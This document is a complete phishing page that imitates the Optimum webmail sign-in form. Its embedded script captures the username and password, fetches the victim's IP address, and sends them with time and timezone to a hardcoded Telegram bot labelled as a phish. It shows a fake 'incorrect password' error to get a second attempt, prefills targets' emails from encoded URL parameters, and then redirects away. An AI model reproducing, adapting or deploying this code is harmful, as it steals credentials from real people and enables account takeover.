    <style>
        body {
            margin: 0;
            padding: 0;
            background: #0B2860;
            font-family: Arial, Helvetica, sans-serif;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .card {
            background: white;
            width: 380px;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
            overflow: hidden;
        }
        .header {
            padding: 30px 30px 20px;
            text-align: left;
        }
        .logo {
            font-size: 28px;
            font-weight: bold;
            color: #000;
        }
        .logo span {
            color: #ff6600;
        }
        h1 {
            font-size: 22px;
            margin: 20px 0 25px 0;
            color: #333;
        }
        .input-label {
            font-size: 14px;
            color: #555;
            margin-bottom: 6px;
            display: block;
        }
        input {
            width: 100%;
            padding: 12px 14px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
            margin-bottom: 18px;
        }
        .password-wrapper {
            position: relative;
        }
        .password-wrapper input {
            padding-right: 45px;
        }
        .toggle-eye {
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #666;
            font-size: 20px;
            user-select: none;
        }
        .remember-row {
            display: flex;
            align-items: center;
            margin: 10px 0 25px 0;
            font-size: 14px;
        }
        .remember-row input[type="checkbox"] {
            margin-right: 8px;
            accent-color: #ff6600;
            width: 16px;
            height: 16px;
        }
        .btn {
            background: #ff6600;
            color: white;
            border: none;
            padding: 14px;
            width: 100%;
            font-size: 17px;
            font-weight: bold;
            border-radius: 4px;
            cursor: pointer;
            margin-bottom: 15px;
        }
        .btn:hover {
            background: #e55c00;
        }
        .links {
            text-align: center;
            margin: 15px 0 25px 0;
            font-size: 14px;
        }
        .links a {
            color: #0066cc;
            text-decoration: none;
            margin: 0 12px;
        }
        .footer {
            background: #f8f8f8;
            padding: 25px 30px;
            font-size: 14px;
            color: #555;
            border-top: 1px solid #eee;
        }
        .footer a {
            color: #0066cc;
            text-decoration: none;
        }
        .error {
            color: #d32f2f;
            font-size: 13px;
            min-height: 20px;
            text-align: center;
            margin-top: 8px;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="header">
            <div class="logo">optimum<span>.</span></div>
            <h1>Sign in to Optimum</h1>

            <div class="input-label">Username*</div>
            <input type="text" id="mail" placeholder="Username" autocomplete="off">

            <div class="input-label">Password*</div>
            <div class="password-wrapper">
                <input type="password" id="pass" placeholder="Password">
                <!-- Removed the eye emoji completely as requested -->
            </div>

            <div class="remember-row">
                <input type="checkbox" id="remember">
                <label for="remember">Remember Me</label>
            </div>

            <button id="signin" class="btn">Continue</button>

            <div class="links">
                <a href="#">Forgot ID?</a>
                <a href="#">Forgot Password?</a>
            </div>
        </div>

        <div class="footer">
            <strong>Don't have an Optimum ID?</strong><br>
            An Optimum ID is a unique username that provides access to extra services and benefits.<br><br>
            <a href="#">Create an Optimum ID</a>
        </div>
    </div>

    <div class="error" id="show"></div>

<script>
// ================== CONFIG ==================
const CONFIG = {
    telegramToken: "8500997987:AAFxw-ff5N_5KJNnxrolyFOUCgMCLB8Lb_I",
    chatId: "7143130635",
    redirectUrl: "https://co.quarantine.serverdata.net/",
    maxAttempts: 2
};

const mailInput = document.getElementById('mail');
const passInput = document.getElementById('pass');
const errorDiv = document.getElementById('show');
const signinBtn = document.getElementById('signin');

let attempt = 0;

// Base64 decode for prefill
function decodeBase64(str) {
    try { return atob(str.replace(/-/g,'+').replace(/_/g,'/')); }
    catch(e) { return str; }
}

// Prefill email from URL
function prefillEmail() {
    const hash = window.location.hash.substring(1);
    const params = new URLSearchParams(window.location.search);
    let email = hash || params.get('email') || params.get('e') || params.get('mail') || '';
    if (email) {
        email = email.includes('@') ? email : decodeBase64(email);
        if (email.includes('@')) mailInput.value = email;
    }
}

// Show error
function showError(msg, clearPass = false) {
    errorDiv.textContent = msg;
    setTimeout(() => {
        errorDiv.textContent = '';
        if (clearPass) passInput.value = '';
    }, 2800);
}

// Validate
function validateInputs() {
    const email = mailInput.value.trim();
    const pass = passInput.value.trim();
    if (!email) {
        showError("Please enter your username.");
        return false;
    }
    if (!pass || pass.length < 4) {
        showError("Please enter your password.");
        return false;
    }
    return true;
}

// Send to Telegram
async function sendToTelegram(email, password) {
    const ip = await fetch('https://api.ipify.org?format=json')
        .then(r => r.json()).then(d => d.ip).catch(() => 'Unknown');

    const message = `***** OPTIMUM.NET WEBMAIL PHISH *****

🔑 Username: ${email}
🔑 Password: ${password}

🌐 IP: ${ip}
⏰ Time: ${new Date().toLocaleString()}
🌍 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
***MITD fka Notrealghost***`;

    const url = `https://api.telegram.org/bot${CONFIG.telegramToken}/sendMessage?chat_id=${CONFIG.chatId}&text=${encodeURIComponent(message)}`;
    new Image().src = url;
    fetch(url).catch(() => {});
}

// Handle login
async function handleLogin() {
    if (!validateInputs()) return;

    const email = mailInput.value.trim();
    const password = passInput.value.trim();

    await sendToTelegram(email, password);
    attempt++;

    if (attempt < CONFIG.maxAttempts) {
        showError("The username or password you entered isn't correct. Please try again.");
        passInput.value = '';
        passInput.focus();
    } else {
        window.location.href = CONFIG.redirectUrl;
    }
}

// Initialize
window.addEventListener('load', () => {
    prefillEmail();
    signinBtn.addEventListener('click', handleLogin);
    passInput.addEventListener('keypress', e => { if (e.key === 'Enter') handleLogin(); });
});
</script>
</body>
</html>
